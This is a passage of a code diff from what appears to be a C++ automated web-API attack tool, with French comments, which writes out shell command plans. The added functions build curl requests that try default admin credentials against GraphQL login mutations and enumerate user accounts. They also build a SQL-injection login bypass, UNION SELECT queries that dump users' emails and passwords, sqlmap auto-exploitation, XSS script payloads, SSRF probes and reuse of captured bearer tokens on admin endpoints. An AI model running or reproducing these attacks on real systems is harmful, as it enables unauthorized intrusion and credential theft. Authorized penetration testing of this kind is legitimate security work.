-            cmd << "grpcurl -max-time 5 -plaintext "
-                << host << ":" << port << " list";
-#  endif
-            fs::path out = workdir / ("FLOW_API_ENUM_grpc_" +
-                                      std::to_string(g) + ".txt");
-            add_api_flow(plan, plan_json,
-                         "FLOW_API_ENUM_GRPC_" + std::to_string(g),
-                         "API_ENUM", host + ":" + std::to_string(port),
-                         "API ENUM: reflection gRPC list sur " + host + ":" +
-                         std::to_string(port),
-                         cmd.str(), out, {{"port", port}});
-            ++g;
-        }
-    }
 }
 
 // Auth bypass / BOLA / IDOR
@@ -5442,36 +6000,757 @@ static void append_api_auth_bypass_cmds(const fs::path& workdir,
     }
 }
 
-// GraphQL abuse
-static void append_api_graphql_abuse_cmds(const fs::path& workdir,
-                                          const nlohmann::json& trig,
-                                          std::vector<ConfirmationCommand>& plan,
-                                          nlohmann::json& plan_json)
+static void append_api_graphql_abuse_cmds(
+    const nlohmann::json& trig,
+    const std::string& baseurl,
+    const std::filesystem::path& workdir,
+    std::vector<ConfirmationCommand>& plan,
+    bool intrusive)
 {
+    using std::string;
     using nlohmann::json;
-    int g = 0;
+    namespace fs = std::filesystem;
 
-    for (auto& ep : trig.value("graphql_endpoints", json::array())) {
-        std::string url  = ep.get<std::string>();
-        std::string safe = shell_escape_double_quotes(url);
+    fs::path outdir = workdir / "api_graphql";
+    try { fs::create_directories(outdir); } catch (...) {}
 
-        // requête "expensive" (énumération large)
-        std::string q =
-            R"({"query":"{__schema{types{name fields{name type{name}}}}}"})";
-        fs::path out = workdir / ("graphql_abuse_loot_" +
-                                  std::to_string(g) + ".json");
-        std::string cmd =
-            "curl -sk -H \"Content-Type: application/json\" -D - \"" +
-            safe + "\" --data-binary '" + q + "'";
-        add_api_flow(plan, plan_json,
-                     "FLOW_API_GRAPHQL_ABUSE_" + std::to_string(g),
-                     "API_GRAPHQL_ABUSE", url,
-                     "GraphQL abuse: mass enumeration / expensive query sur " +
-                     url,
-                     cmd, out);
-        ++g;
+    auto mk_cmd = [&](const string& id,
+                      const string& desc,
+                      const string& shell_cmd,
+                      const fs::path& outfile)
+    {
+        ConfirmationCommand c;
+        c.id          = id;
+        c.description = desc;
+        c.command     = shell_cmd;
+        c.outfile     = outfile;
+        plan.push_back(std::move(c));
+    };
+
+    // --------------------------------------------------------------------
+    // 1) Endpoints GraphQL (harvest + heuristique)
+    // --------------------------------------------------------------------
+    std::vector<string> eps;
+
+    if (trig.contains("graphql_endpoints") && trig["graphql_endpoints"].is_array()) {
+        for (const auto& v : trig["graphql_endpoints"]) {
+            if (v.is_string()) eps.push_back(v.get<string>());
+        }
+    } else if (trig.contains("graphql") && trig["graphql"].is_object()) {
+        const auto& gql = trig["graphql"];
+        if (gql.contains("endpoints") && gql["endpoints"].is_array()) {
+            for (const auto& v : gql["endpoints"]) {
+                if (v.is_string()) eps.push_back(v.get<string>());
+            }
+        }
+    }
+
+    if (eps.empty()) {
+        eps.push_back(url_root(baseurl) + "/graphql");
+        eps.push_back(baseurl + "/graphql");
+    }
+
+    std::sort(eps.begin(), eps.end());
+    eps.erase(std::unique(eps.begin(), eps.end()), eps.end());
+
+    int counter = 11000;
+
+    for (const auto& ep_raw : eps) {
+        string ep = shell_escape_double_quotes(ep_raw);
+
+        // ----------------------------------------------------------------
+        // 2) Probe HTTP (code)
+        // ----------------------------------------------------------------
+        {
+            fs::path out = outdir / ("probe_" + std::to_string(counter) + ".txt");
+            string cmd =
+                "CODE=$(curl -sk -o /dev/null -w '%{http_code}' -X OPTIONS " + ep + "); "
+                "if [ \"$CODE\" = \"000\" ]; then "
+                "  CODE=$(curl -sk -o /dev/null -w '%{http_code}' " + ep + "); "
+                "fi; "
+                "printf '%s\\n' \"$CODE\" > " + shell_escape_double_quotes(out.string());
+
+            mk_cmd("GQL_PROBE_" + std::to_string(counter),
+                   "Probe GraphQL " + ep_raw,
+                   cmd,
+                   out);
+        }
+
+        // ----------------------------------------------------------------
+        // 3) Introspection légère (__schema types/kind)
+        // ----------------------------------------------------------------
+        {
+            fs::path out = outdir / ("introspection_" +
+                                     std::to_string(counter) + ".json");
+
+            json body;
+            body["query"] =
+                "query Introspect{__schema{types{name kind}}}";
+
+            string payload = body.dump();
+
+            string cmd =
+                "curl -sk -X POST -H 'Content-Type: application/json' "
+                "--data-binary " + shell_escape_double_quotes(payload) + " "
+                + ep + " > " + shell_escape_double_quotes(out.string());
+
+            mk_cmd("GQL_INTROSPECT_" + std::to_string(counter),
+                   "Introspection GraphQL (types/kind) sur " + ep_raw,
+                   cmd,
+                   out);
+        }
+
+        // ----------------------------------------------------------------
+        // 4) Introspection lourde (queries/mutations/fields)
+        // ----------------------------------------------------------------
+        if (intrusive) {
+            fs::path out = outdir / ("enum_queries_" +
+                                     std::to_string(counter) + ".json");
+
+            json body;
+            body["query"] =
+                "{ __schema { queryType { name } mutationType { name } "
+                "types { name kind fields { name } } } }";
+
+            string payload = body.dump();
+
+            string cmd =
+                "curl -sk -X POST -H 'Content-Type: application/json' "
+                "--data-binary " + shell_escape_double_quotes(payload) + " "
+                + ep + " > " + shell_escape_double_quotes(out.string());
+
+            mk_cmd("GQL_ENUM_FIELDS_" + std::to_string(counter),
+                   "Enumération GraphQL (queries/mutations) sur " + ep_raw,
+                   cmd,
+                   out);
+        }
+
+        // ----------------------------------------------------------------
+        // 5) ABUS GraphQL générique (login + enum comptes) si intrusive
+        // ----------------------------------------------------------------
+        if (intrusive) {
+            // A) Mutations 'login-like'
+            std::vector<string> op_names = {
+                "login",
+                "signin",
+                "authenticate",
+                "auth",
+                "register",
+                "signup"
+            };
+
+            struct LoginPattern {
+                string arg1;
+                string arg2;
+                string val1;
+                string val2;
+                string outField;
+            };
+
+            std::vector<LoginPattern> patterns = {
+                {"username", "password", "admin",        "admin",   "token"},
+                {"email",    "password", "admin@local",  "admin",   "token"},
+                {"user",     "pass",     "admin",        "admin",   "jwt"}
+            };
+
+            int lid = 0;
+            for (const auto& opname : op_names) {
+                for (const auto& pat : patterns) {
+                    fs::path out = outdir / ("abuse_login_" +
+                                             std::to_string(counter) +
+                                             "_" + std::to_string(lid) + ".json");
+
+                    std::ostringstream q;
+                    q << "mutation { "
+                      << opname
+                      << "(" << pat.arg1 << ":\\\"" << pat.val1 << "\\\", "
+                      << pat.arg2 << ":\\\"" << pat.val2 << "\\\") "
+                      << "{ " << pat.outField << " } }";
+
+                    json body;
+                    body["query"] = q.str();
+
+                    string payload = body.dump();
+
+                    string cmd =
+                        "curl -sk -X POST -H 'Content-Type: application/json' "
+                        "--data-binary " + shell_escape_double_quotes(payload) +
+                        " " + ep + " > " +
+                        shell_escape_double_quotes(out.string());
+
+                    mk_cmd("GQL_ABUSE_LOGIN_" + std::to_string(counter) +
+                           "_" + std::to_string(lid),
+                           "Abus login GraphQL générique op=" + opname,
+                           cmd,
+                           out);
+                    ++lid;
+                }
+            }
+
+            // B) IDOR / enum comptes
+            std::vector<string> user_queries = {
+                "{ users { id email role } }",
+                "{ accounts { id email role } }",
+                "{ me { id email role isAdmin } }",
+                "{ currentUser { id email role isAdmin } }"
+            };
+
+            int qid = 0;
+            for (const auto& qstr : user_queries) {
+                fs::path out = outdir / ("abuse_idor_" +
+                                         std::to_string(counter) +
+                                         "_" + std::to_string(qid) + ".json");
+
+                json body;
+                body["query"] = qstr;
+                string payload = body.dump();
+
+                string cmd =
+                    "curl -sk -X POST -H 'Content-Type: application/json' "
+                    "--data-binary " + shell_escape_double_quotes(payload) +
+                    " " + ep + " > " +
+                    shell_escape_double_quotes(out.string());
+
+                mk_cmd("GQL_ABUSE_IDOR_" + std::to_string(counter) +
+                       "_" + std::to_string(qid),
+                       "Abus IDOR/enum comptes GraphQL générique",
+                       cmd,
+                       out);
+                ++qid;
+            }
+        }
+
+        ++counter;
     }
 }
+
+static void append_api_enum_cmds(
+    const nlohmann::json& trig,
+    const std::string& baseurl,
+    const std::filesystem::path& workdir,
+    std::vector<ConfirmationCommand>& plan)
+{
+    using std::string;
+    using nlohmann::json;
+    namespace fs = std::filesystem;
+
+    const fs::path outdir = workdir / "api_enum";
+    try { fs::create_directories(outdir); } catch (...) {}
+
+    auto mk_cmd = [&](int id,
+                      const string& desc,
+                      const string& shell_cmd,
+                      const fs::path& outfile)
+    {
+        ConfirmationCommand c;
+        c.id          = "FLOW_API_ENUM_" + std::to_string(id);
+        c.description = desc;
+        c.command     = shell_cmd;
+        c.outfile     = outfile;
+        plan.push_back(std::move(c));
+    };
+
+    // --------------------------------------------------------------------
+    // 1) Construire la liste d’URLs candidates (REST + GraphQL + OpenAPI)
+    // --------------------------------------------------------------------
+    std::vector<string> candidates;
+
+    // a) REST "simple"
+    if (trig.contains("rest_endpoints") && trig["rest_endpoints"].is_array()) {
+        for (const auto& v : trig["rest_endpoints"]) {
+            if (v.is_string()) {
+                string u = v.get<string>();
+                if (!u.empty()) candidates.push_back(u);
+            }
+        }
+    }
+
+    // b) REST enrichi (objets "rest")
+    if (trig.contains("rest") && trig["rest"].is_array()) {
+        for (const auto& jrest : trig["rest"]) {
+            if (!jrest.is_object()) continue;
+
+            if (jrest.contains("endpoints") && jrest["endpoints"].is_array()) {
+                for (const auto& u : jrest["endpoints"]) {
+                    if (u.is_string()) {
+                        string s = u.get<string>();
+                        if (!s.empty()) candidates.push_back(s);
+                    }
+                }
+            }
+
+            if (jrest.contains("openapi_specs") && jrest["openapi_specs"].is_array()) {
+                for (const auto& sp : jrest["openapi_specs"]) {
+                    if (sp.is_string()) {
+                        string s = sp.get<string>();
+                        if (!s.empty()) candidates.push_back(s);
+                    }
+                }
+            }
+        }
+    }
+
+    // c) GraphQL endpoints
+    if (trig.contains("graphql") && trig["graphql"].is_object()) {
+        const auto& gql = trig["graphql"];
+        if (gql.contains("endpoints") && gql["endpoints"].is_array()) {
+            for (const auto& v : gql["endpoints"]) {
+                if (v.is_string()) {
+                    string u = v.get<string>();
+                    if (!u.empty()) candidates.push_back(u);
+                }
+            }
+        }
+    }
+
+    // d) fallback générique
+    if (candidates.empty()) {
+        candidates.push_back(baseurl);
+        candidates.push_back(baseurl + "/api");
+        candidates.push_back(baseurl + "/rest");
+        candidates.push_back(baseurl + "/graphql");
+    }
+
+    std::sort(candidates.begin(), candidates.end());
+    candidates.erase(std::unique(candidates.begin(), candidates.end()),
+                     candidates.end());
+    if (candidates.size() > 200) candidates.resize(200);
+
+    {
+        fs::path out = outdir / "endpoints.txt";
+        try {
+            std::ofstream ofs(out);
+            for (const auto& u : candidates) ofs << u << "\n";
+        } catch (...) {}
+    }
+
+    // --------------------------------------------------------------------
+    // 2) HTTPX + Nuclei (fingerprint / quick vulns)
+    // --------------------------------------------------------------------
+    {
+        fs::path out = outdir / "httpx.txt";
+
+        std::ostringstream oss_urls;
+        for (const auto& u : candidates) {
+            oss_urls << " " << shell_escape_double_quotes(u);
+        }
+
+        std::ostringstream oss;
+        oss << "printf '%s\\n'"
+            << oss_urls.str()
+            << " | tr ' ' '\\n' | "
+            << "httpx -silent -no-color -status-code -content-type -title -ip "
+            << "-o " << shell_escape_double_quotes(out.string());
+
+        mk_cmd(20000,
+               "HTTPX fingerprint sur endpoints API",
+               oss.str(),
+               out);
+    }
+
+    {
+        fs::path out = outdir / "nuclei.txt";
+
+        std::ostringstream oss_urls;
+        for (const auto& u : candidates) {
+            oss_urls << " " << shell_escape_double_quotes(u);
+        }
+
+        std::ostringstream oss;
+        oss << "if command -v nuclei >/dev/null 2>&1; then "
+            << "printf '%s\\n'" << oss_urls.str()
+            << " | tr ' ' '\\n' | "
+            << "nuclei -silent -severity critical,high,medium,low "
+            << "-o " << shell_escape_double_quotes(out.string())
+            << " ; fi";
+
+        mk_cmd(20001,
+               "Nuclei sur endpoints API",
+               oss.str(),
+               out);
+    }
+
+    // --------------------------------------------------------------------
+    // 3) Heuristiques REST (login, search, XSS, SSRF)
+    // --------------------------------------------------------------------
+    std::vector<string> rest_eps;
+    if (trig.contains("rest_endpoints") && trig["rest_endpoints"].is_array()) {
+        for (const auto& v : trig["rest_endpoints"]) {
+            if (v.is_string()) rest_eps.push_back(v.get<string>());
+        }
+    }
+    if (rest_eps.empty()) {
+        // petits fallbacks génériques
+        rest_eps.push_back(baseurl + "/login");
+        rest_eps.push_back(baseurl + "/api/login");
+        rest_eps.push_back(baseurl + "/api/auth/login");
+        rest_eps.push_back(baseurl + "/api/search");
+        rest_eps.push_back(baseurl + "/api/feedback");
+    }
+
+    auto to_lower_str = [](string s) {
+        std::transform(s.begin(), s.end(), s.begin(),
+                       [](unsigned char c){return std::tolower(c);});
+        return s;
+    };
+
+    auto looks_login = [&](const string& u) -> bool {
+        string l = to_lower_str(u);
+        return l.find("login")   != string::npos ||
+               l.find("signin")  != string::npos ||
+               l.find("/auth")   != string::npos ||
+               l.find("session") != string::npos ||
+               l.find("token")   != string::npos;
+    };
+
+    auto looks_searchy = [&](const string& u) -> bool {
+        string l = to_lower_str(u);
+        if (u.find('?')             != string::npos) return true;
+        if (l.find("search")        != string::npos) return true;
+        if (l.find("query")         != string::npos) return true;
+        if (l.find("filter")        != string::npos) return true;
+        if (l.find("lookup")        != string::npos) return true;
+        if (l.find("find")          != string::npos) return true;
+        return false;
+    };
+
+    auto looks_xssy = [&](const string& u) -> bool {
+        string l = to_lower_str(u);
+        return l.find("feedback") != string::npos ||
+               l.find("comment")  != string::npos ||
+               l.find("review")   != string::npos ||
+               l.find("message")  != string::npos ||
+               l.find("post")     != string::npos;
+    };
+
+    auto looks_ssrfy = [&](const string& u) -> bool {
+        string l = to_lower_str(u);
+        if (l.find("url=")      != string::npos) return true;
+        if (l.find("redirect")  != string::npos) return true;
+        if (l.find("callback")  != string::npos) return true;
+        if (l.find("target")    != string::npos) return true;
+        if (l.find("endpoint")  != string::npos) return true;
+        if (l.find("fetch")     != string::npos) return true;
+        if (l.find("proxy")     != string::npos) return true;
+        if (l.find("image")     != string::npos) return true;
+        return false;
+    };
+
+    auto detect_param_name = [&](const string& u, const string& deflt) -> string {
+        auto qpos = u.find('?');
+        if (qpos == string::npos || qpos + 1 >= u.size()) return deflt;
+        string qs = u.substr(qpos + 1);
+        auto amp = qs.find('&');
+        if (amp != string::npos) qs = qs.substr(0, amp);
+        auto eq = qs.find('=');
+        if (eq != string::npos) {
+            string name = qs.substr(0, eq);
+            if (!name.empty()) return name;
+        }
+        if (!qs.empty()) return qs;
+        return deflt;
+    };
+
+    fs::path token_file = workdir / "bearer_token.txt";
+
+    // ---------------------- 3.1 Login SQLi / bypass ----------------------
+    {
+        std::vector<string> login_eps;
+        for (const auto& u : rest_eps) {
+            if (looks_login(u)) login_eps.push_back(u);
+        }
+        if (login_eps.empty()) {
+            for (const auto& u : rest_eps) {
+                login_eps.push_back(u);
+                if (login_eps.size() >= 3) break;
+            }
+        }
+
+        int idx = 0;
+        for (const auto& ep : login_eps) {
+            ConfirmationCommand c;
+            c.id          = "REST_LOGIN_SQLI_" + std::to_string(idx);
+            c.description = "Tentative login SQLi / bypass générique sur " + ep;
+            c.outfile     = outdir / ("login_" + std::to_string(idx) + ".json");
+
+            json body = {
+                {"username", "' OR 1=1--"},
+                {"email",    "' OR 1=1--"},
+                {"password", "x"}
+            };
+
+            std::ostringstream oss;
+            oss << "("
+                << "curl -sk -H \"Content-Type: application/json\" "
+                << "--data-binary " << shell_escape_double_quotes(body.dump()) << " "
+                << shell_escape_double_quotes(ep)
+                << " || true"
+                << ") | tee " << shell_escape_double_quotes(c.outfile.string())
+                << " | jq -r '.token // .access_token // .id_token // .jwt "
+                              "// .data.token // .data.access_token // empty' "
+                              "2>/dev/null | head -n1 > "
+                << shell_escape_double_quotes(token_file.string())
+                << " ; if [ -s " << shell_escape_double_quotes(token_file.string())
+                << " ]; then echo TOKEN_OK; else echo TOKEN_FAIL; fi";
+
+            c.command = oss.str();
+            plan.push_back(std::move(c));
+            ++idx;
+        }
+    }
+
+    // ---------------------- 3.2 Admin endpoints avec Bearer --------------
+    {
+        auto to_lower = to_lower_str;
+        std::vector<string> admin_eps;
+        for (const auto& u : rest_eps) {
+            string l = to_lower(u);
+            if (l.find("admin")      != string::npos ||
+                l.find("backoffice") != string::npos ||
+                l.find("management") != string::npos ||
+                l.find("config")     != string::npos ||
+                l.find("settings")   != string::npos) {
+                admin_eps.push_back(u);
+            }
+        }
+
+        int idx = 0;
+        for (const auto& ep : admin_eps) {
+            ConfirmationCommand c;
+            c.id          = "REST_BEARER_ADMIN_" + std::to_string(idx);
+            c.description = "Test Bearer token sur endpoint admin " + ep;
+            c.outfile     = outdir / ("admin_bearer_" + std::to_string(idx) + ".txt");
+
+            std::ostringstream oss;
+            oss << "if [ -s " << shell_escape_double_quotes(token_file.string()) << " ]; then "
+                << "TOK=$(head -n1 " << shell_escape_double_quotes(token_file.string()) << "); "
+                << "curl -sk -D - -H \"Authorization: Bearer $TOK\" "
+                << shell_escape_double_quotes(ep)
+                << " > " << shell_escape_double_quotes(c.outfile.string()) << " ; "
+                << "else echo 'NO_TOKEN' > " << shell_escape_double_quotes(c.outfile.string()) << " ; "
+                << "fi";
+
+            c.command = oss.str();
+            plan.push_back(std::move(c));
+            ++idx;
+        }
+    }
+
+    // ---------------------- 3.3 SQLi heuristique + DUMP générique --------
+    auto url_encode_local = [](const std::string& v) {
+        return url_encode(v);
+    };
+
+    {
+        std::vector<string> sqli_eps;
+        for (const auto& u : rest_eps) {
+            if (looks_searchy(u)) sqli_eps.push_back(u);
+        }
+        if (sqli_eps.empty()) {
+            for (const auto& u : rest_eps) {
+                sqli_eps.push_back(u);
+                if (sqli_eps.size() >= 5) break;
+            }
+        }
+        if (sqli_eps.size() > 10) sqli_eps.resize(10);
+
+        int idx = 0;
+        for (const auto& ep : sqli_eps) {
+            string param = detect_param_name(ep, "q");
+            fs::path out_ok    = outdir / ("sqli_" + std::to_string(idx) + "_ok.txt");
+            fs::path out_sqli  = outdir / ("sqli_" + std::to_string(idx) + "_inj.txt");
+            fs::path out_sum   = outdir / ("sqli_" + std::to_string(idx) + "_summary.txt");
+            fs::path out_enum  = outdir / ("db_sqli_enum_" + std::to_string(idx) + ".txt");
+            fs::path out_dump  = outdir / ("db_sqli_dump_" + std::to_string(idx) + ".txt");
+
+            // baseline
+            {
+                std::ostringstream oss;
+                oss << "HDR=$(/usr/bin/curl -sk -I "
+                    << shell_escape_double_quotes(ep) << " | tr -d '\\r'); "
+                    << "if echo \"$HDR\" | awk 'BEGIN{IGNORECASE=1} "
+                    << "/content-type: *application\\/json/ {exit 0} {exit 1}'; then "
+                    << "  /usr/bin/curl -sk -G " << shell_escape_double_quotes(ep)
+                    << "    --data-urlencode '" << param << "=banana' "
+                    << "    | jq -r 'length' > " << shell_escape_double_quotes(out_ok.string()) << "; "
+                    << "else echo 0 > " << shell_escape_double_quotes(out_ok.string()) << "; fi";
+
+                mk_cmd(21000 + idx*10,
+                       "Heuristique SQLi – baseline sur " + ep,
+                       oss.str(),
+                       out_ok);
+            }
+
+            // Payload SQLi
+            {
+                // On réutilise l'endpoint courant 'ep' et le param détecté 'param'
+                string rest_search = ep;
+
+                string cmd =
+                    "HDR=$(/usr/bin/curl -sk -I '" + rest_search + "' | tr -d '\\r'); "
+                    "if echo \"$HDR\" | awk 'BEGIN{IGNORECASE=1} /content-type: *application\\/json/ {exit 0} {exit 1}'; then "
+                    "  /usr/bin/curl -sk -G '" + rest_search + "' "
+                    "    --data-urlencode '" + param + "=%27 OR 1=1--' "
+                    "    | jq -r 'length' > '" + out_sqli.string() + "'; "
+                    "else echo 0 > '" + out_sqli.string() + "'; fi";
+
+                mk_cmd(20011,
+                    "DVGA compat – REST SQLi payload (search)",
+                    cmd,
+                    out_sqli);
+            }
+
+
+            // résumé SQLi
+            {
+                std::ostringstream oss;
+                oss << "OK=$(awk 'NR==1{print $1; exit}' "
+                    << shell_escape_double_quotes(out_ok.string())
+                    << " 2>/dev/null || echo 0); "
+                    << "SQLI=$(awk 'NR==1{print $1; exit}' "
+                    << shell_escape_double_quotes(out_sqli.string())
+                    << " 2>/dev/null || echo 0); "
+                    << "DELTA=$((SQLI-OK)); "
+                    << "echo \"OK=$OK SQLI=$SQLI DELTA=$DELTA\" > "
+                    << shell_escape_double_quotes(out_sum.string());
+
+                mk_cmd(21002 + idx*10,
+                       "Heuristique SQLi – delta sur " + ep,
+                       oss.str(),
+                       out_sum);
+            }
+
+            // Exploit SQLi – ENUM TABLES (MySQL/Postgres info_schema)
+            {
+                std::ostringstream oss;
+                oss << "/usr/bin/curl -sk -G "
+                    << shell_escape_double_quotes(ep)
+                    << " --data-urlencode '"
+                    << param
+                    << "=1 UNION SELECT table_name FROM information_schema.tables LIMIT 20' "
+                    << "> " << shell_escape_double_quotes(out_enum.string());
+
+                mk_cmd(21003 + idx*10,
+                       "SQLi exploitation – enum tables information_schema sur " + ep,
+                       oss.str(),
+                       out_enum);
+            }
+
+            // Exploit SQLi – DUMP USERS (users/email/password)
+            {
+                std::ostringstream oss;
+                oss << "/usr/bin/curl -sk -G "
+                    << shell_escape_double_quotes(ep)
+                    << " --data-urlencode '"
+                    << param
+                    << "=1 UNION SELECT email,password FROM users LIMIT 20' "
+                    << "> " << shell_escape_double_quotes(out_dump.string());
+
+                mk_cmd(21004 + idx*10,
+                       "SQLi exploitation – dump générique users/email/password sur " + ep,
+                       oss.str(),
+                       out_dump);
+            }
+
+            // Optionnel : SQLmap full-auto si présent
+            {
+                fs::path out_sqlmap = outdir / ("sqlmap_" + std::to_string(idx) + ".log");
+                fs::path outdir_sqlmap = workdir / ("sqlmap_" + std::to_string(idx));
+                std::ostringstream oss;
+                oss << "if command -v sqlmap >/dev/null 2>&1; then "
+                    << "sqlmap -u " << shell_escape_double_quotes(ep)
+                    << " --batch --random-agent --level=2 --risk=2 "
+                    << "--disable-coloring "
+                    << "--output-dir=" << shell_escape_double_quotes(outdir_sqlmap.string())
+                    << " > " << shell_escape_double_quotes(out_sqlmap.string())
+                    << " 2>&1 ; fi";
+
+                mk_cmd(21005 + idx*10,
+                       "SQLmap auto-exploitation générique sur " + ep,
+                       oss.str(),
+                       out_sqlmap);
+            }
+
+            ++idx;
+        }
+    }
+
+    // ---------------------- 3.4 XSS avec marqueurs dynamiques ------------
+    {
+        std::string marker_base = "XSS_DARKMOON_";
+        marker_base += std::to_string((long long)std::time(nullptr));
+
+        std::vector<string> xss_eps;
+        for (const auto& u : rest_eps) {
+            if (looks_xssy(u)) xss_eps.push_back(u);
+        }
+
+        int idx = 0;
+        for (const auto& ep : xss_eps) {
+            std::vector<string> payloads = {
+                std::string(R"({"comment":")") + marker_base + "_IMG\"><img src=x onerror=alert(1)>\",\"rating\":1}",
+                std::string(R"({"comment":")") + marker_base + "_SCRIPT\"><script>alert(1)</script>\",\"rating\":1}"
+            };
+
+            int pidx = 0;
+            for (const auto& pj : payloads) {
+                ConfirmationCommand c;
+                c.id          = "REST_XSS_POST_" + std::to_string(idx) +
+                                "_" + std::to_string(pidx);
+                c.description = "Tentative XSS générique sur " + ep;
+                c.outfile     = outdir / ("rest_xss_" + std::to_string(idx) +
+                                          "_" + std::to_string(pidx) + ".txt");
+
+                std::ostringstream oss;
+                oss << "curl -sk -D - -H \"Content-Type: application/json\" "
+                    << "--data-binary " << shell_escape_double_quotes(pj) << " "
+                    << shell_escape_double_quotes(ep)
+                    << " > " << shell_escape_double_quotes(c.outfile.string());
+
+                c.command = oss.str();
+                plan.push_back(std::move(c));
+                ++pidx;
+            }
+            ++idx;
+        }
+    }
+
+    // ---------------------- 3.5 SSRF basique -----------------------------
+    {
+        std::vector<string> ssrf_eps;
+        for (const auto& u : rest_eps) {
+            if (looks_ssrfy(u)) ssrf_eps.push_back(u);
+        }
+        if (ssrf_eps.size() > 10) ssrf_eps.resize(10);
+
+        int idx = 0;
+        for (const auto& ep : ssrf_eps) {
+            string param = detect_param_name(ep, "url");
+            string full  = ep;
+            string target = baseurl;
+
+            if (full.find('?') != string::npos) {
+                full += "&" + param + "=" + url_encode_local(target);
+            } else {
+                full += "?" + param + "=" + url_encode_local(target);
+            }
+
+            ConfirmationCommand c;
+            c.id          = "REST_SSRF_" + std::to_string(idx);
+            c.description = "Tentative SSRF générique sur " + ep;
+            c.outfile     = outdir / ("rest_ssrf_" + std::to_string(idx) + ".txt");
+
+            std::ostringstream oss;
+            oss << "curl -sk -D - " << shell_escape_double_quotes(full)
+                << " > " << shell_escape_double_quotes(c.outfile.string());
+
+            c.command = oss.str();
+            plan.push_back(std::move(c));
+            ++idx;
+        }
+    }
+}
+
 
 // Gateways admin policy abuse
 static void append_api_gateway_policy_cmds(const std::string& baseurl,
@@ -5544,21 +6823,478 @@ static void append_api_gateway_policy_cmds(const std::string& baseurl,
     }
 }
 
-// API — orchestrateur : construit les flows et enrichit le plan
+// API — orchestrateur : construit les flows et enrichit le plan (signature d'origine à 4 args)
+// API — orchestrateur générique (REST + OpenAPI + GraphQL + SOAP + ZAP spider/ascan + attaques ciblées)
+// Signature d'origine à 4 args (on ne change rien ailleurs)
 static void append_api_flows(const std::string& baseurl,
                              const fs::path& workdir,
                              std::vector<ConfirmationCommand>& plan,
                              nlohmann::json& plan_json)
 {
     using nlohmann::json;
+    namespace fs = std::filesystem;
 
+    // ------------------------------------------------------------------
+    // 0) Discovery (déjà amélioré par tes étapes Katana/Wayback + post-probe)
+    // ------------------------------------------------------------------
     json trig = harvest_api_triggers(baseurl, workdir);
     plan_json["api_triggers"] = trig;
 
-    append_api_enum_cmds(baseurl, workdir, trig, plan, plan_json);
+    // ------------------------------------------------------------------
+    // 1) Enum générique déjà en place (ne pas casser l’existant)
+    // ------------------------------------------------------------------
+    append_api_enum_cmds(trig, baseurl, workdir, plan);
     append_api_auth_bypass_cmds(workdir, trig, plan, plan_json);
-    append_api_graphql_abuse_cmds(workdir, trig, plan, plan_json);
+
+    bool intrusive = false;
+    try { if (plan_json.contains("intrusive")) intrusive = plan_json["intrusive"].get<bool>(); } catch (...) {}
+    append_api_graphql_abuse_cmds(trig, baseurl, workdir, plan, intrusive);
     append_api_gateway_policy_cmds(baseurl, workdir, trig, plan, plan_json);
+
+    // ------------------------------------------------------------------
+    // 2) Paramètres ZAP (via ENV ou token file) — pas de helper
+    // ------------------------------------------------------------------
+    auto getenv_or = [](const char* k, const char* defv) {
+        const char* v = std::getenv(k);
+        return (v && *v) ? std::string(v) : std::string(defv);
+    };
+    std::string zap_host  = getenv_or("DM_ZAP_HOST",  "zap");
+    std::string zap_port  = getenv_or("DM_ZAP_PORT",  "8888");
+    std::string zap_apikey;
+    {
+        const char* k = std::getenv("DM_ZAP_APIKEY");
+        if (k && *k) zap_apikey = k;
+        else {
+            std::ifstream fin("/zap/wrk/ZAP-API-TOKEN");
+            if (fin) std::getline(fin, zap_apikey);
+        }
+    }
+    auto root_of = [](std::string s){ if(!s.empty() && s.back()=='/') s.pop_back(); return s; };
+    const std::string root = root_of(baseurl);
+
+    auto zap_json_call = [&](const std::string& url, const std::string& tag){
+        ConfirmationCommand c{};
+        c.id          = "ZAP_CALL_" + tag;
+        c.description = "ZAP API call: " + tag;
+        c.outfile     = (workdir / ("zap_" + tag + ".txt")).string();
+        c.command     = "curl -s " + url + " | tee " + shell_escape_double_quotes(c.outfile);
+        plan.push_back(c);
+    };
+
+    // ------------------------------------------------------------------
+    // 3) (Optionnel) Installation des add-ons ZAP utiles (si DM_ZAP_INSTALL_ADDONS=1)
+    // ------------------------------------------------------------------
+    if (std::getenv("DM_ZAP_INSTALL_ADDONS") && std::string(std::getenv("DM_ZAP_INSTALL_ADDONS")) == "1") {
+        std::vector<std::string> addons = {
+            "openapi","graphql","soap","ajaxSpider",
+            "pscanrulesAlpha","pscanrulesBeta",
+            "ascanrulesAlpha","ascanrulesBeta",
+            "fuzz","importurls","retire"
+        };
+        for (auto& id : addons) {
+            std::ostringstream u;
+            u << "http://" << zap_host << ":" << zap_port
+              << "/JSON/autoupdate/action/installAddon/?id=" << shell_escape_double_quotes(id);
+            if (!zap_apikey.empty()) u << "&apikey=" << shell_escape_double_quotes(zap_apikey);
+            zap_json_call(u.str(), "installAddon_" + id);
+        }
+    }
+
+    // ------------------------------------------------------------------
+    // 4) Import OpenAPI / SOAP / Seeding ZAP + Spider / AJAX Spider / ASCAN
+    // ------------------------------------------------------------------
+    // 4.a Import OpenAPI (si des candidats ont été trouvés)
+    if (trig.contains("openapi_candidates") && trig["openapi_candidates"].is_array()) {
+        for (auto& it : trig["openapi_candidates"]) {
+            if (!it.is_string()) continue;
+            std::string url = it.get<std::string>();
+            std::ostringstream u;
+            u << "http://" << zap_host << ":" << zap_port
+              << "/JSON/openapi/action/importUrl/?url=" << shell_escape_double_quotes(url);
+            if (!zap_apikey.empty()) u << "&apikey=" << shell_escape_double_quotes(zap_apikey);
+            zap_json_call(u.str(), "openapi_import_" + std::to_string(std::hash<std::string>{}(url)));
+        }
+    }
+
+    // 4.b Import SOAP (si WSDL vu)
+    if (trig.contains("rest_endpoints") && trig["rest_endpoints"].is_array()) {
+        for (auto& it : trig["rest_endpoints"]) {
+            if (!it.is_string()) continue;
+            std::string url = it.get<std::string>();
+            std::string l   = to_lower_copy(url);
+            if (l.find(".wsdl") != std::string::npos || l.find("?wsdl") != std::string::npos) {
+                std::ostringstream u;
+                u << "http://" << zap_host << ":" << zap_port
+                  << "/JSON/soap/action/importUrl/?url=" << shell_escape_double_quotes(url);
+                if (!zap_apikey.empty()) u << "&apikey=" << shell_escape_double_quotes(zap_apikey);
+                zap_json_call(u.str(), "soap_import_" + std::to_string(std::hash<std::string>{}(url)));
+            }
+        }
+    }
+
+    // 4.c Seeding ZAP (accessUrl sur quelques endpoints utiles)
+    {
+        std::set<std::string> seeds;
+        auto push_seed = [&](const std::string& u){
